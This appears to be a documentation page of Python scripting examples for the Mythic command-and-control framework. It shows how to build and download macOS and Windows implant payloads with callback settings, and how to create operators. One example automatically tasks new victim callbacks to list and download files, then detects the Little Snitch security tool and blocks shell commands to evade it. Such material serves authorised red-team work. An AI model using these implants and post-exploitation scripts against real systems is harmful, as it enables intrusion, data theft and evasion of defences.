# Scripting Examples

## What is this page?

This is a small repository of sample code doing common scripting actions to serve as a reference for operators and developers.

## Assumptions

This page assumes that every script has the same following basic outline and will only reference the main script driver (the `scripting` function) and any additional functions created to help support the desired outcome:

```python
from mythic import mythic_rest
from sys import exit
from os import system
import asyncio


async def scripting():
    # sample login
    # we'll always include this function
    

# everything below here is expected as a staple at the end of your program
# this launches the functions asynchronously and keeps the program running while long-running tasks are going
async def main():
    await scripting()
    try:
        while True:
            pending = asyncio.Task.all_tasks()
            plist = []
            for p in pending:
                if p._coro.__name__ != "main" and p._state == "PENDING":
                    plist.append(p)
            if len(plist) == 0:
                exit(0)
            else:
                await asyncio.gather(*plist)
    except KeyboardInterrupt:
        pending = asyncio.Task.all_tasks()
        for t in pending:
            t.cancel()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())

```

### Logging in and getting info about our operator:

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    me = await mythic.get_self()
    await mythic_rest.json_print(me)  # information about us
    my_op = await mythic.get_current_operation_info()
    await mythic_rest.json_print(my_op)  # information about our current operation
```

### Creating and downloading an apfell payload:

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    # define what our payload should be
    p = mythic_rest.Payload(
        # what payload type is it
        payload_type="apfell", 
        # define non-default c2 profile variables
        c2_profiles={
            "http":[
                    {"name": "callback_host", "value": "http://192.168.205.151"},
                    {"name": "callback_interval", "value": 4}
                ]
            },
        # give our payload a description if we want
        tag="test build",
        selected_os="macOS",
        # if we want to only include specific commands, put them here:
        #commands=["cmd1", "cmd2", "cmd3"],
        # what do we want the payload to be called
        filename="scripted_apfell.js")
    print("[+] Creating new apfell payload")
    # create the payload and include all commands
    # if we define commands in the payload definition, then remove the all_commands=True piece
    resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
    print("[*] Downloading apfell payload")
    # payload_contents is now the raw bytes of the payload
    payload_contents = await mythic.download_payload(resp.response)
    with open("my_output", "wb") as f:
        f.write(payload_contents)  # write out to disk
```

### Creating an atlas payload:

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    p = mythic_rest.Payload(
        payload_type="atlas", 
        c2_profiles={
            "http":[
                    {"name": "callback_host", "value": "http://192.168.205.151"},
                    {"name": "callback_interval", "value": 4}
                ]
            },
        build_parameters=[
            {
                "name": "version", "value": 4.0
            },
            {
                "name": "output_type", "value": "WinExe"
            }
        ],
        tag=".NET EXE",
        selected_os="Windows",
        filename="atlas.exe")
    resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
    payload_contents = await mythic.download_payload(resp.response)
```

### Creating users and adding them to an operation:

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    # define our operator
    new_operator = mythic_rest.Operator(username="new_operator", password="password1234")
    # create them
    new_operator_resp = await mythic.create_operator(new_operator)
    # reference our operation
    operation = mythic_rest.Operation(name="Operation Chimera")
    # add the user to our operation
    await mythic.add_or_update_operator_for_operation(operation=operation, operator=new_operator_resp.response)
```

### Take actions on new callback:

This script waits for new callbacks, then executes a function which:

* Issues the `ls` command, parses that output for specific files and if they exist, downloads them
* Issues the `list_apps` function and searches for dangerous processes. If one is found, gets/creates a new blocked command list and applies it to the operators

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    # define a function to execute on new callback
    await mythic.listen_for_new_callbacks(analyze_callback)
    
async def analyze_callback(mythic, callback):
    # function gets an intance of mythic and the callback object
    try:
    # create a new task to execute on this callback
        task = mythic_rest.Task(
            callback=callback, command="ls", params="."
        )
        print("[+] got new callback, issuing ls")
        submit = await mythic.create_task(task, return_on="completed")
        print("[*] waiting for ls results...")
        # wait up to 20s for the task to finish and get all the responses from it
        results = await mythic.gather_task_responses(submit.response.id, timeout=20)
        # results is now an array of responses
        folder  = json.loads(results[0].response)
        print("[*] going through results looking for interesting files...")
        for f in folder["files"]:
            if f["name"] == "apfellserver":
                task = mythic_rest.Task(
                    callback=callback, command="download", params="apfellserver"
                )
                print("[+] found an interesting file, tasking it for download")
                await mythic.create_task(task, return_on="submitted")
        task = mythic_rest.Task(
            callback=callback, command="list_apps"
        )
        print("[+] tasking callback to list running applications")
        # return_on="submitted" means don't wait for responses
        list_apps_submit = await mythic.create_task(task, return_on="submitted")
        print("[*] waiting for list_apps results...")
        # instead, we'll manually gather tasks until the task is completed or errors out
        results = await mythic.gather_task_responses(list_apps_submit.response.id)
        # gather responses returns an array of responses
        apps = json.loads(results[0].response)
        print("[*] going through results looking for dangerous processes...")
        for a in apps:
            if "Little Snitch Agent" in a["name"]:
                list_apps_submit.response.comment = "Auto processed, created alert on Little Snitch Agent, updating block lists"
                await mythic.set_comment_on_task(list_apps_submit.response)
                print("[+] found a dangerous process! Little Snitch Agent - sending alert to operators")
                await mythic.create_event_message(message=mythic_rest.EventMessage(message="LITTLE SNITCH DETECTED on {}".format(callback.host), level='warning'))
                resp = await mythic.get_all_disabled_commands_profiles()
                print("[+] Getting/creating disabled command profile to prevent bad-opsec commands based on dangerous processes")
                snitchy_block_list_exists = False
                for cur_dcp in resp.response:
                    if cur_dcp.name == "snitchy block list":
                        snitchy_block_list_exists = True
                        dcp = cur_dcp
                if not snitchy_block_list_exists:
                    dcp = mythic_rest.DisabledCommandsProfile(name="snitchy block list", payload_types=[
                        PayloadType(ptype="apfell", commands=["shell", "shell_elevated"]),
                        PayloadType(ptype="poseidon", commands=["shell"])
                    ])
                    resp = await mythic.create_disabled_commands_profile(dcp)
                current_operation = (await mythic.get_current_operation_info()).response
                for member in current_operation.members:
                    print("[*] updating block list for {}".format(member.username))
                    resp = await mythic.update_disabled_commands_profile_for_operator(profile=dcp, operator=member, operation=current_operation)

    except Exception as e:
        print(str(e))
```

### Send a warning message for the operation:

```python
from mythic import mythic_rest
async def scripting():
    # sample login
    mythic = mythic_rest.Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    await mythic.create_event_message(message=mythic_rest.EventMessage(message="DANGER, WILL ROBINSON", level='warning'))
```
